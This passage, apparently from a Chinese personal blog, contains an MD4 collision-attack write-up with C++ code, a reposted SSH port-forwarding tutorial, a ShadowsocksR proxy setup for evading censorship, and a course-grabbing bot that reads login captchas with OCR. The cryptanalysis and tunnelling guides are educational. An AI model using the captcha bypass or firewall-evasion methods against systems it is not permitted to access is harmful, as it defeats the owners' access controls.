进制数，都是可以任意选取的。\nMD4 压缩函数 # 记填充后的消息为 $\\bar{M}$，对 $\\bar{M}$ 中的任一 512bit 块 $M$，将其划分为 16 个 32bit 字 $(m_0, m_1, \u0026hellip;, m_{15})$。同时，定义 $(aa,bb,cc,dd)$ 为链接变量，也就是上一消息块经过压缩后的输出，或者说压缩本消息块所用到的输入。在第一轮，链接变量的值就是上述 a,b,c,d 的初始值。\n压缩函数的主体是三轮，或者说 48 步运算：\n$$ \\text{For\\ j = 0,1,2\\ and\\ i = 0,1,2,3}\\\\ a = \\phi_j(a,b,c,d,w_{j,4i},s_{j,4i})\\\\ d = \\phi_j(d,a,b,c,w_{j,4i+1},s_{j,4i+1})\\\\ c = \\phi_j(c,d,a,b,w_{j,4i+2},s_{j,4i+2})\\\\ b = \\phi_j(b,c,d,a,w_{j,4i+3},s_{j,4i+3}) $$\n这里的 w 是消息字，s 是循环左移的位数。压缩函数的最后一步意外简单，将计算得到的链接变量 a,b,c,d 加到输入的链接变量 aa,bb,cc,dd 上：\n$$ aa = (a + aa)\\ mod\\ 2^{32}\\\\ bb = (b + bb)\\ mod\\ 2^{32}\\\\ cc = (c + cc)\\ mod\\ 2^{32}\\\\ dd = (d + dd)\\ mod\\ 2^{32} $$\n如果这里的 $M$ 是最后一个消息块，那么 $H(\\bar{M}) = aa|bb|cc|dd$，否则用 $(aa,bb,cc,dd)$ 作为下一个消息块的输入链接变量。\n注意到这里的四个表达式和上面的三个 $\\phi$ 系列表达式都含有 $mod\\ 2^{32}$ 这个特殊的模运算。从 01 串的角度看，这个运算相当于截取该串的低 32 位。而由上述分析我们已知，参与运算的 a,b,c,d、F/G/H 函数的输出、以及 $m_k$ 都是 32bit 的 01 串，或者说 unsigned int。这构成了一个美妙的巧合，那就是：在利用 unsigned int 进行四则运算时默认自动丢弃溢出的位，而这与 $mod\\ 2^{32}$ 的效果完全一致！\n当然，实际上这并不是巧合。\n引理与记号 # 下面给出的定理都只涉及位运算，逻辑十分简单，却是后面推导充分条件的关键所在。\nF 函数引理 # $$ F(x,y,z) = F(\\lnot x,y,z)\\ \\text{iff}\\ y=z\\\\ F(x,y,z) = F(x,\\lnot y,z)\\ \\text{iff}\\ x=0\\\\ F(x,y,z) = F(x,y,\\lnot z)\\ \\text{iff}\\ x=1 $$\nG 函数引理 # $$ G(x,y,z) = G(\\lnot x,y,z)\\ \\text{iff}\\ y=z\\\\ G(x,y,z) = G(x,\\lnot y,z)\\ \\text{iff}\\ x=z\\\\ G(x,y,z) = G(x,y,\\lnot z)\\ \\text{iff}\\ x=y $$\nH 函数引理 # $$ H(x,y,z) = \\lnot H(\\lnot x,y,z) = \\lnot H(x,\\lnot y,z) = \\lnot H(x,y,\\lnot z)\\\\ H(x,y,z) = H(\\lnot x,\\lnot y,z) = H(x,\\lnot y,\\lnot z) = H(\\lnot x,y,\\lnot z) $$\n记号 # 下文中只有一个记号是不怎么常见的，那就是 $x_i[\\pm j_1,\\pm j_2,\u0026hellip;,\\pm j_l]$，它表示改变 $x_i$ 的第 $j_1,j_2,\u0026hellip;,j_l$ 位后得到的 01 串。正号表示将该位从 0 变成 1，负号相反。\n等价转换方法 # 在原文中，为了说明这种方法作者举了一个简单的例子，对于：\n$$ \\Delta c_2 = c_2\u0026rsquo;- c_2 = -2^{18} + 2^{21} $$\n用刚才的记号表示，就是 $c_2\u0026rsquo;= c_2[-19,22]$。在一些特定的差分路径上需要将其中的单 bit 差分扩展成多 bit 差分，这就需要一种等价转换方法。显然这里 $-2^{18}=2^{18}+2^{19}-2^{20}$，也就是说 $c_2[-19] = c_2[19,20,-21]$。综上：\n$$ c_2\u0026rsquo;= c_2[19,20,-21,22] $$\nMD4 碰撞攻击 # 攻击分为三步：\n构造一对差分 M 与 M' 由此生成充分条件 对随机消息 M 进行修改来尽可能满足之前的充分条件 差分构造与充分条件推导 # 构造 M 与 M\u0026rsquo;，使得：\n$$ \\Delta M = M\u0026rsquo;- M = (\\Delta m_0, \\Delta m_1, \u0026hellip;, \\Delta m_{15})\\\\ \\Delta m_1 = 2^{31},\\ \\ \\Delta m_2 = 2^{31}-2^{28},\\ \\ \\Delta m_{12} = -2^{16}\\\\ \\Delta m_i = 0,\\ \\ 0\\le i\\le 15,\\ \\ i\\ne 1,2,12 $$\n接下来就是寻找碰撞差分，并根据 F/G/H 函数的上述引理，生成使得差分性质能够被满足的一系列充分条件。只需要尽可能保证这些充分条件成立，即可大幅提高产生碰撞的概率。在论文中，作者在表 5 中给出了碰撞差分的特征，在表 6 中给出了所有充分条件，由于表格较长这里不再搬运。\n作者举了一个详细的例子来说明，我们如何生成这样的充分条件。\n对于如下变换（表 5 中的第 9 步）：\n$$ (b_2[-13,-14,15], c_2[19,20,-21,-22], d_2[14], a_2)\\\\ \\to (a_3[17], b_2[-13,-14,15], c_2[19,20,-21,22], d_2[14]) $$\n我们已经知道：\n$$ a_3 = ((a_2 + F(b_2, c_2, d_2) + m_8)\\ mod\\ 2^{32}) \\lll 3 $$\n由F 函数引理 1，为了让 $b_2$ 第 13 位和 15 位上的变化不影响 $a_3$，我们可以令 $c_2$ 和 $d_2$ 在第 13 和 15 位上相等。\n由F 函数引理 2，为了让 $c_3$ 第 19-22 位上的变化不影响 $a_3$，我们可以令 $b_2$ 第 19-22 位全部为 0。\n由 F 函数性质，构造 $b_{2,14}=1, d_{2,14}=0, c_{2,14}=0$，这样当 $b_2$ 和 $d_2$ 的第 14 位分别由 1 变 0 和由 0 变 1 时（ $c_2$ 不变），F 函数返回值就会由 0 变 1。也就是说，$F(b_{2,14}, c_{2,14}, d_{2,14}) = 0, F(\\lnot b_{2,14}, c_{2,14}, \\lnot d_{2,14}) = 1$，再把相应的 i、j 和移位（根据表 5，第 9 步的移位为 3）代入压缩函数的第一个表达式中，就可以得到 $\\Delta a_3 = 2^{16}$。\n我们最后令 $a_3$ 第 17 位为 0，就可以得到 $a_3\u0026rsquo;= a_3[17]$。\n于是上述 10 个条件足够保证第 9 步的差分性质成立，也就是说这 10 个条件是第 9 步的充分条件。其余每步的充分条件的推导都类似。\n消息修改 # 如果没有消息修改，要让 M 与 M’ 碰撞只有 $2^{-122}$ 的概率，还远远不如生日攻击的 $2^{64}$，因此作者提出通过消息修改来尽可能多满足一些充分条件，提升碰撞概率。\n多步消息修改的本质在于利用单步消息修改，满足尽可能多的充分条件而不破坏已满足的那些条件。因此其原理与单步消息修改相同，这里不作过多赘述。值得一提的是，多步消息修改可以将碰撞概率提升到 $2^{-6}$ ~ $2^{-2}$，只需要至多 $2^8$ 次 MD4 运算，考虑到 MD4 运算中，填充耗时可忽略，计算时一共只有 48 轮 $\\phi$ 函数运算，且 $\\phi$ 函数中只用到了位运算与加法运算，该算法找到一对 MD4 碰撞的消息所需要的时间只需用秒来计算。\n而单步消息修改的原理是十分简单的：对于任意一个变量 $x$，如果我们希望令 $x$ 的第 $i$ 位为 0，只需要将 $x$ 与 $y$ 异或一下，其中 $y$ 的第 $i$ 位与 $x$ 的第 $i$ 位相同，其余位都为 0。这是由非常简单又非常经典的异或的性质告诉我们的。如果我们希望令 $x$ 的第 $i$ 位为 1，或者希望令 $x$ 和 $z$ 的第 $i$ 位相等，那么原理是相同的。\n作者给的例子是关于 $m_1$ 的修改：\n$$ d_1\\gets d_1\\oplus (d_{1,7} \\lll 6)\\oplus ((d_{1,8}\\oplus a_{1,8})\\lll 7)\\oplus ((d_{1,11}\\oplus a_{1,11})\\lll 10)\\\\ m_1\\gets (d_1\\ggg 7) - d_0 - F(a_1, b_0, c_0) $$\n注意此处的 $d_{1,7}$ 指的是：最低位为 $d_1$ 的第 7 位，前 31 位全为 0 的串，也因此需要左移 6 位（似乎不需要循环左移？）。\n经过单步消息修改后，碰撞概率提升到了约 $2^{-25}$，这个概率看起来很小，但是经过测试，我发现只需要 $2^{24}$ ~ $2^{27}$ 次 MD4 运算，也就是 4-8 分钟左右就可以找到 MD4 碰撞，不算太慢？尽管如此，多步消息修改在 RIPEMD 和 MD5 的碰撞攻击中的作用，就举足轻重了。\n代码实现 # 我觉得 C++ 应该会快一点于是用了 C++ 实现。首先是要定义好数据结构。\n其余数据结构，比如存储移位量的数组、存储消息 M 与 M’ 的数组都很容易定义，然而表 6 中的充分条件存储起来却让人很头疼。几经修改后，我采用了如下方式：\n... // Following: {x=0, x=1, x==y} {{}, {}, {7}}, // a1 {{7}, {}, {8, 11}}, // d1 {{11}, {7, 8}, {26}}, // c1 {{8, 11, 26}, {7}, {}}, // b1 ... 对照表 6 应该很好理解。\n利用 unsigned 类型存所有链变量和消息块（原因上面已经写了），定义好 FGH 函数，以及循环移位、取特定位等辅助函数，接下来就是实现核心功能了：\nclass Msg { public: Msg() {data = vec_u(16);} explicit Msg(const vec_u \u0026amp;_data) {data = _data;} vec_u data; static unsigned modify(const int \u0026amp;i); vec_u md4(); void print_val(const char name[], int length); private: void round1(); void round2(); void round3(); }; 三轮压缩函数很简单，比较难的是消息修改：\nunsigned Msg::modify(const int \u0026amp;i) { unsigned m = e(); chain_var[i] = l_rotate(chain_var[i-4] + F(chain_var[i-1], chain_var[i-2], chain_var[i-3]) + m, shift[i%4]); for (int j = 0; suf_cond[i][0][j]; ++j) chain_var[i] ^= bit(chain_var[i], suf_cond[i][0][j]); for (int j = 0; suf_cond[i][1][j]; ++j) chain_var[i] ^= bit(~chain_var[i], suf_cond[i][1][j]); for (int j = 0; suf_cond[i][2][j]; ++j) chain_var[i] ^= bit(chain_var[i], suf_cond[i][2][j]) ^ bit(chain_var[i-1], suf_cond[i][2][j]); m = r_rotate(chain_var[i], shift[i%4]) - chain_var[i-4] - F(chain_var[i-1], chain_var[i-2], chain_var[i-3]); return m; } 最后在主函数中调用修改：\nfor (int i = 4; i \u0026lt; 20; ++i) m.data[i-4] = m_.data[i-4] = Msg::modify(i); // Construct differential m_.data[1] += (1\u0026lt;\u0026lt;31); m_.data[2] += (1\u0026lt;\u0026lt;31); m_.data[2] -= (1\u0026lt;\u0026lt;28); m_.data[12] -= (1\u0026lt;\u0026lt;16); 这里仅给出了核心代码，不过理解了核心代码，其余细节也迎刃而解了。总的来说，理解这篇论文还是颇有难度的，从理解原理到代码实现也仍有很长一段距离。\n","date":"2019-03-06","permalink":"/posts/md4-collision/","section":"Posts","summary":"\u003cp\u003e重复了王小云教授 14 年前的工作，RIPEMD/MD5/SHA 家族碰撞原理类似。\u003c/p\u003e","title":"短兵相接：MD4 碰撞攻击"},{"content":"","date":"2019-03-06","permalink":"/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/","section":"Tags","summary":"","title":"位运算"},{"content":"驾驭魔法，需要先掌握魔法的原理。\n版权声明：本文转载自 IBM Developer。纠正了原文中的一些笔误。\n第一部分 概述 # 当你在咖啡馆享受免费 WiFi 的时候，有没有想到可能有人正在窃取你的密码及隐私信息？当你发现实验室的防火墙阻止了你的网络应用端口，是不是有苦难言？来看看 SSH 的端口转发功能能给我们带来什么好处吧！\n端口转发概述 # 让我们先来了解一下端口转发的概念吧。我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做 “隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，那么也是能够通过将 TCP 端口转发来使用 SSH 进行通讯。总的来说 SSH 端口转发能够提供两大功能：\n加密 SSH Client 端至 SSH Server 端之间的通讯数据。 突破防火墙的限制完成一些之前无法建立的 TCP 连接。 图 1. SSH 端口转发\n如上图所示，使用了端口转发之后，TCP 端口 A 与 B 之间现在并不直接通讯，而是转发到了 SSH 客户端及服务端来通讯，从而自动实现了数据加密并同时绕过了防火墙的限制。\n第二部分 本地转发与远程转发 # 本地转发实例分析 # 我们先来看第一个例子，在实验室里有一台 LDAP 服务器 LdapServerHost，但是限制了只有本机上部署的应用才能直接连接此 LDAP 服务器。如果我们由于调试或者测试的需要想临时从远程机器 LdapClientHost 直接连接到这个 LDAP 服务器 , 有什么方法能够实现呢？\n答案无疑是本地端口转发了，它的命令格式是：\nssh -L \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;SSH hostname\u0026gt; 在 LdapClientHost 上执行如下命令即可建立一个 SSH 的本地端口转发，例如：\nssh -L 7001:localhost:389 LdapServerHost 图 2. 本地端口转发\n这里需要注意的是本例中我们选择了 7001 端口作为本地的监听端口，在选择端口号时要注意非管理员帐号是无权绑定 1-1023 端口的，所以一般是选用一个 1024-65535 之间的并且尚未使用的端口号即可。\n然后我们可以将远程机器 LdapClientHost 上的应用直接配置到本机的 7001 端口上（而不是 LDAP 服务器的 389 端口上）。之后的数据流将会是下面这个样子：\n我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上， 而本机的 SSH Client 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Server 上。 SSH Server 会解密收到的数据并将之转发到监听的 LDAP 389 端口上， 最后再将从 LDAP 返回的数据原路返回以完成整个流程。 我们可以看到，这整个流程应用并没有直接连接 LDAP 服务器，而是连接到了本地的一个监听端口，但是 SSH 端口转发完成了剩下的所有事情，加密，转发，解密，通讯。\n这里有几个地方需要注意：\nSSH 端口转发是通过 SSH 连接建立起来的，我们必须保持这个 SSH 连接以使端口转发保持生效。一旦关闭了此连接，相应的端口转发也会随之关闭。 我们只能在建立 SSH 连接的同时创建端口转发，而不能给一个已经存在的 SSH 连接增加端口转发。 你可能会疑惑上面命令中的 \u0026lt;remote host\u0026gt; 为什么用 localhost，它指向的是哪台机器呢？在本例中，它指向 LdapServertHost。我们为什么用 localhost 而不是 IP 地址或者主机名呢？其实这个取决于我们之前是如何限制 LDAP 只有本机才能访问。如果只允许 loopback 接口访问的话，那么自然就只有 localhost 或者 IP 为 127.0.0.1 才能访问了，而不能用真实 IP 或者主机名。 命令中的 \u0026lt;remote host\u0026gt; 和 \u0026lt;SSH hostname\u0026gt; 必须是同一台机器么？其实是不一定的，它们可以是两台不同的机器。我们在后面的例子里会详细阐述这点。 好了，我们已经在 LdapClientHost 建立了端口转发，那么这个端口转发可以被其他机器使用么？比如能否新增加一台 LdapClientHost2 来直接连接 LdapClientHost 的 7001 端口？答案是不行的，在主流 SSH 实现中，本地端口转发绑定的是 loopback 接口，这意味着只有 localhost 或者 127.0.0.1 才能使用本机的端口转发 , 其他机器发起的连接只会得到 connection refused.。好在 SSH 同时提供了 GatewayPorts 关键字，我们可以通过指定它与其他机器共享这个本地端口转发。 ssh -g -L \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;SSH hostname\u0026gt; 远程转发实例分析 # 我们来看第二个例子，这次假设由于网络或防火墙的原因我们不能用 SSH 直接从 LdapClientHost 连接到 LDAP 服务器 LdapServertHost，但是反向连接却是被允许的。那此时我们的选择自然就是远程端口转发了。\n它的命令格式是：\nssh -R \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;SSH hostname\u0026gt; 例如在 LDAP 服务器 LdapServertHost 端执行如下命令：\nssh -R 7001:localhost:389 LdapClientHost 图 3. 远程端口转发\n和本地端口转发相比，这次的图里，SSH Server 和 SSH Client 的位置对调了一下，但是数据流依然是一样的。我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，而本机的 SSH Server 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Client 上。 SSH Client 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，最后再将从 LDAP 返回的数据原路返回以完成整个流程。\n看到这里，你是不是会有点糊涂了？为什么叫本地转发，而有时又叫远程转发？这两者有什么区别？\n本地转发与远程转发的对比与分析 # 不错，SSH Server，SSH Client，LdapServertHost，LdapClientHost，本地转发，远程转发，这么多的名词的确容易让人糊涂。让我们来分析一下其中的结构吧。首先，SSH 端口转发自然需要 SSH 连接，而 SSH 连接是有方向的，从 SSH Client 到 SSH Server 。而我们的应用也是有方向的，比如需要连接 LDAP Server 时，LDAP Server 自然就是 Server 端，我们应用连接的方向也是从应用的 Client 端连接到应用的 Server 端。如果这两个连接的方向一致，那我们就说它是本地转发。而如果两个方向不一致，我们就说它是远程转发。\n我们可以回忆上面的两个例子来做个对照。\n本地转发时：\nLdapClientHost 同时是应用的客户端，也是 SSH Client，这两个连接都从它指向 LdapServertHost（既是 LDAP 服务端，也是 SSH Server）。\n远程转发时：\nLdapClientHost 是应用的客户端，但却是 SSH Server ；而 LdapServertHost 是 LDAP 的服务端，但却是 SSH Client 。这样两个连接的方向刚好相反。\n另一个方便记忆的方法是，Server 端的端口都是预定义的固定端口（SSH Server 的端口 22，LDAP 的端口 389），而 Client 端的端口都是动态可供我们选择的端口（如上述例子中选用的 7001 端口）。如果 Server 端的两个端口都在同一台机器，Client 端的两个端口都在另一台机器上，那么这就是本地连接；如果这四个端口交叉分布在两个机器上，每台机器各有一个 Server 端端口，一个 Client 端端口，那就是远程连接。\n弄清楚了两者的区别之后，再来看看两者的相同之处。如果你所在的环境下，既允许 LdapClientHost 发起 SSH 连接到 LdapServerHost，也允许 LdapServerHost 发起 SSH 连接到 LdapClientHost。那么这时我们选择本地转发或远程转发都是可以的，能完成一样的功能。\n接着让我们来看个进阶版的端口转发。我们之前涉及到的各种连接 / 转发都只涉及到了两台机器，还记得我们在本地转发中提到的一个问题么？本地转发命令中的 \u0026lt;remote host\u0026gt; 和 \u0026lt;SSH hostname\u0026gt; 可以是不同的机器么？\nssh -L \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;SSH hostname\u0026gt; 答案是可以的！让我们来看一个涉及到四台机器 (A,B,C,D) 的例子。\n图 4. 多主机转发应用\n在 SSH Client(C) 执行下列命令来建立 SSH 连接以及端口转发：\nssh -g -L 7001:\u0026lt;B\u0026gt;:389 \u0026lt;D\u0026gt; 然后在我们的应用客户端（A）上配置连接机器（C）的 7001 端口即可。注意我们在命令中指定了 -g 参数以保证机器（A）能够使用机器（C）建立的本地端口转发。而另一个值得注意的地方是，在上述连接中，（A）\u0026lt;-\u0026gt; (C) 以及 (B) \u0026lt;-\u0026gt; (D) 之间的连接并不是安全连接，它们之间没有经过 SSH 的加密及解密。如果他们之间的网络并不是值得信赖的网络连接，我们就需要谨慎使用这种连接方式了。\n第三部分 其他类型的转发 # 动态转发实例分析 # 嗯，动态转发，听上去很酷。当你看到这里时，有没有想过我们已经讨论过了本地转发，远程转发，但是前提都是要求有一个固定的应用服务端的端口号，例如前面例子中的 LDAP 服务端的 389 端口。那如果没有这个端口号怎么办？等等，什么样的应用会没有这个端口号呢？嗯，比如说用浏览器进行 Web 浏览，比如说 MSN 等等。\n当我们在一个不安全的 WiFi 环境下上网，用 SSH 动态转发来保护我们的网页浏览及 MSN 信息无疑是十分必要的。让我们先来看一下动态转发的命令格式：\nssh -D \u0026lt;local port\u0026gt; \u0026lt;SSH Server\u0026gt; 例如：\nssh -D 7001 \u0026lt;SSH Server\u0026gt; 图 5. 动态端口转发\n似乎很简单，我们依然选择了 7001 作为本地的端口号，其实在这里 SSH 是创建了一个 SOCKS 代理服务。来看看帮助文档中对 -D 参数的描述：\n-D port This works by allocating a socket to listen to port on the local side, and whenever a connection is made to this port, the con- nection is forwarded over the secure channel, and the applica- tion protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server. Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file. 之后的使用就简单了，我们可以直接使用 localhost:7001 来作为正常的 SOCKS 代理来使用，直接在浏览器或 MSN 上设置即可。在 SSH Client 端无法访问的网站现在也都可以正常浏览。而这里需要值得注意的是，此时 SSH 所包护的范围只包括从浏览器端（SSH Client 端）到 SSH Server 端的连接，并不包含从 SSH Server 端 到目标网站的连接。如果后半截连接的安全不能得到充分的保证的话，这种方式仍不是合适的解决方案。\nX 协议转发实例分析 # 好了，让我们来看最后一个例子 - X 协议转发。\n我们日常工作当中，可能会经常会远程登录到 Linux/Unix/Solaris/HP 等机器上去做一些开发或者维护，也经常需要以 GUI 方式运行一些程序，比如要求图形化界面来安装 DB2/WebSphere 等等。这时候通常有两种选择来实现：VNC 或者 X 窗口，让我们来看看后者。\n使用 X 窗口通常需要分别安装：X Client 和 X Server 。在本例中我们的 X Client 就是所访问的远程 Linux/Unix/Solaris/HP，而我们的 X Server 则是发起访问的本地机器（例如你面前正在使用的笔记本或台式机）。把 X Client 端的 X 窗口显示在 X Server 端需要先行在 X Client 端指定 X Server 的位置，命令格式如下：\nexport DISPLAY=\u0026lt;X Server IP\u0026gt;:\u0026lt;display #\u0026gt;.\u0026lt;virtual #\u0026gt; 例如：\nexport DISPLAY=myDesktop:1.0 然后直接运行 X 应用即可，X 窗口就会自动在我们的本地端打开。\n一切运行正常，但是，这时候 IT 部门突然在远程 Linux/Unix/Solaris/HP 前面加了一道防火墙。非常不幸的是，X 协议并不在允许通过的列表之内。怎么办？只能使用 VNC 了么？不，其实只要使用了 SSH 端口转发即可通过，同时也对 X 通讯数据做了加密，真是一举两得。（当然，使用此方法前最好先咨询相关 IT 部门是否符合相应的安全条例，以免造成违规操作。）\n建立命令也很简单，直接从本地机器（X Server 端）发起一个如下的 SSH 连接即可：\nssh -X \u0026lt;SSH Server\u0026gt; 图 6. X 转发\n建立连接之后就可以直接运行远程的 X 应用。注意建立 X 转发之后会自动设置 DISPLAY 环境变量，通常会被设置成 localhost:10.0，我们无需也不应该在连接之后再进行修改此环境变量。\n一个比较常见的场景是，我们的本地机器是 Windows 操作系统，这时可以选择开源的 XMing 来作为我们的 XServer，而 SSH Client 则可以任意选择了，例如 PuTTY，Cygwin 均可以配置访问 SSH 的同时建立 X 转发。\n第四部分 总结 # 至此，我们已经完成了本地端口转发，远程端口转发，动态端口转发以及 X 转发的介绍。回顾起来，总的思路是通过将 TCP 连接转发到 SSH 通道上以解决数据加密以及突破防火墙的种种限制。对一些已知端口号的应用，例如 Telnet/LDAP/SMTP，我们可以使用本地端口转发或者远程端口转发来达到目的。动态端口转发则可以实现 SOCKS 代理从而加密以及突破防火墙对 Web 浏览的限制。对于 X 应用，无疑是 X 转发最为适用了。虽然每一部分我们都只是简单的介绍了一下，但如果能灵活应用这些技巧，相信对我们的日常生活 / 工作也是会有所帮助的。\n相关主题 # 《SSH 权威指南》（O\u0026rsquo;Reilly 图书）详细介绍了 SSH 相关的更多技术内幕及相关技巧。 在 developerWorks 中国网站 Linux 专区 中学习更多 Linux 方面的知识。 2022.03.10 更新 # 目前原文已消失，当时没有将其中的图片保存到图床，因此所有图片均已失效。\n","date":"2019-03-04","permalink":"/posts/ssh-port-fwd/","section":"Posts","summary":"\u003cp\u003e驾驭魔法，需要先掌握魔法的原理。\u003c/p\u003e","title":"实战 SSH 端口转发"},{"content":"因为众所周知的原因，本文中不会提供任何相关工具的下载链接。\n就在不久前，我原来使用的免费魔法道具莫名失效了。一怒之下我决定寻找一种可持续的魔法来访问网络。\n服务器端 # 由于酸酸乳的大名早有耳闻，结合我校一位大佬的 这篇文章 中给出的方法，就可以搭建好服务器端。我甚至没有使用 GitHub 提供的学生优惠码，因为我一注册 DO（为此我甚至注册了 PayPal）就送了 60 天有效的 $100（这是因为 DO 有邀请注册的机制，比如点 这里 注册同样能获得 $100）。我现在正发愁怎么用掉它……\n期间注册时支付的 $5 第二天才到账，可能 PayPal 是会慢一点？\n因为我的蜜汁自信，建服务器的时候随手加了 SSH key，导致我一开始都不能用用户名和密码登录服务器。在详细的官网文档的帮助下解决了问题，实际上即使在 Windows 环境下，PuTTY 也不是必须安装的，可以用 bash 下更方便的 openssh 来连接。之后也可以生成 SSH 密钥部署好以后通过 SSH 登录。\n花了一些时间的是远程登陆时提示 Permission denied (publickey,gssapi-keyex,gssapi-with-mic) 的问题。原因有很多，网上的解决方案也各不相同，最后还是在靠谱的 StackOverFlow 上找到了适合我的情况：将 /etc/ssh/sshd_config 里的 PasswordAuthentication 设为 yes，随后重启 sshd 服务。\n费用上，最低配置的 VPS 需要 $5 / 月，可以接受。由于有注册的 $5 + 送的 $100（虽然就两个月）+ GitHub 学生包的 $60 + 邀请用户机制，至少可以免费用一年多。如果可以邀请到同学注册 / 拉同学一起施展魔法 / ~~ 拿同学的邮箱注册学生包~~ 的话，免费使用的期限就更长了。所以这个方法还是相当稳定持久的。\n客户端 # 客户端配置就容易多了，下载好酸酸乳，填好配置信息其实就能用了。不过一般都会设置系统代理模式为 PAC 模式，使得魔法仅仅在需要的时候施展，优化上网体验。\n然而一部分网站（别问，问就是不知道）在 PAC 模式下无法访问或者访问时出现异常，这时我们还是需要开启全局模式。这样不断调整酸酸乳的设置比较麻烦，于是 Chrome 插件 SwitchyOmega / Firefox 插件 AutoProxy 允许我们列一个名单，在访问名单内的网址时自动切换至全局模式，访问其它网址则切回 PAC 模式。\n当然酸酸乳好像本来也可以编辑 PAC 列表的。这两个插件提供的最主要的功能在于 “自动切换情景模式”。详细配置方法这里不过多赘述了。\nTO-DO # 最近学校又封网了，由于我尚且不清楚的原因，用学校提供的 Cisco AnyConnect 访问学校内网时，我的魔法出了些问题。原因是什么？能不能让两者共存呢？留坑（2019.03.13 更新：已填）。\n附录 # 酸酸乳的工作原理居然异常简单。类似 SSH 隧道，在客户端代理和 VPS 之间进行加密通讯来避免流量特征分析，而 VPS 和要访问的网站之间的通讯是畅通的。而这个工具的名字来源于它所基于的5 只袜子 SOCKS5 协议（绑定端口 1080）。幸好计网有认真学，没见过的协议也能举一反三大概明白一点。\n最后希望这篇文章不要消失。\n2019.03.09 更新 # 使用时发现速度较慢，于是在服务器端配置了 BBR 加速。这个由 Google 推出的 TCP 拥塞控制协议简直就是黑魔法（要求 Linux 内核 4.9 以上），不仅安装简单而且对速度的提升肉眼可见。\n顺便参考 酸酸乳的一篇文档 调整了酸酸乳的混淆策略，加密算法、协议和混淆算法采用了 none + auth_chain_a + tls1.2_ticket_auth 的组合，大概是更鲁棒了吧。\n2019.03.13 更新 # 今天酸酸乳不知道为什么爆炸了，尝试多种方法无果。IP 地址 + 端口号能 ping 通，服务也重启了几次，VPS 本身和浏览器的 SwitchOmega 并没有什么问题，酸酸乳在两端的配置也没问题，真是奇怪啊。最后通过该端口号解决了，原因不明。\n顺便捣鼓了一下 SwitchyOmega 的配置，对于学校网站用直接相连模式就好了，这样同时开学校的 Anyconnect 和酸酸乳完全没有问题。\nauto switch 是真的好用。\n2021.10.16 更新 # 修复博客的时候看到了这篇文章。\n如今酸酸乳已经不是很好的解决方案了，新兴的 Trojan 协议似乎更胜一筹。\n","date":"2019-03-04","permalink":"/posts/magical-surfing/","section":"Posts","summary":"\u003cp\u003e因为众所周知的原因，本文中不会提供任何相关工具的下载链接。\u003c/p\u003e","title":"凿壁偷光：魔法上网的可持续解决方案"},{"content":"用来在第三轮选课中抢课。\n背景介绍 # 众所周知，ECNU 将选课分为三轮——前两轮中，每人拥有 100 意愿值，并需要将意愿值合理地分配到想要选择的课程上。每轮结束后，系统按意愿值优先的规则进行筛选。而在第三轮，也就是接近开学时的最后一轮中，系统会按时间优先的规则进行筛选，即先到先得。与此同时，为了防止 “屯课” 的现象出现，系统只会在第三轮选课期间每天中午 12：00 放出退课后产生的名额。\n毫无疑问，对于前两轮的倒霉蛋来说，要想在第三轮有所收获，这部分名额极为重要。于是课程掠夺者脚本应运而生。\n技术要点 # 脚本由 Python 语言编写，主要用到的第三方库与辅助程序有：\nselenium chromedriver.exe Pillow Tesseract-OCR pytesseract retrying 技术原理 # 利用 selenium + chromedriver 控制 Chrome 浏览器自动执行命令，并访问 ECNU 公共数据库登录页面。根据用户输入的学号和公共数据库密码进行登录，用户也可以自行更改代码开头的信息来进一步简化操作。由于登录时要求输入验证码，利用 Pillow + Tesseract-OCR + pytesseract 库，先根据验证码在网页中的相对位置截取图片，随后转换为灰度图并用 ImageEnhance 增加图片对比度，最后自动识别图中的验证码并输入。\n登录后依次点击相应的链接。因为在选课期间公共数据库响应速度往往非常慢，而脚本中利用 driver 的选择器定位要点击的链接，所以如果响应过慢将出现 NoSuchElementException。最初用 time.sleep(足够长的时间) 作为解决方案，但是这一时间并不容易设置。因此引入 retrying 库，利用 @retry 装饰器使得定位链接时，如果出现异常就等待 2 秒再重试。这样既不会让每次点击之前都等待 2 秒，又能保证加载过慢时程序不至于异常终止。\n最后则在选课系统中重复输入课程序号（来自用户输入）并点击选课按钮，如果没有选上则刷新页面，直到选上为止。可以通过关闭脚本打开的 Chrome 浏览器，或是按下 \u0026lt;Ctrl+C\u0026gt; 来终止程序。\n注意事项 # 运行前请保证已经下载 chromedriver.exe 且其所在路径已添加到环境变量的 Path 中。同时，请保证已经安装 selenium, Pillow, pytesseract, retrying 四个 Python 第三方库（都可以通过 pip install 安装）以及 Tesseract-OCR 软件。 安装 Tesseract-OCR 时需要在 Path 中添加软件根目录，并在系统变量中添加 TESSDATA_PREFIX 变量，值为软件根目录下的 tessdata 目录。 本脚本文件仅支持 Chrome 浏览器。PhantomJS 和 Firefox 同理，只是驱动程序不同。 使用时，打开命令行，切换到 course.py 文件所在目录，运行 python course.py 并按提示输入信息。随后可以最小化命令行和被打开的 Chrome 浏览器，进行其它工作。 可以直接修改代码开头 my_id、my_pswd、my_course_id 三行内容以简化使用流程。 使用本脚本并不能保证用户抢到心仪的课程。 代码 # from selenium 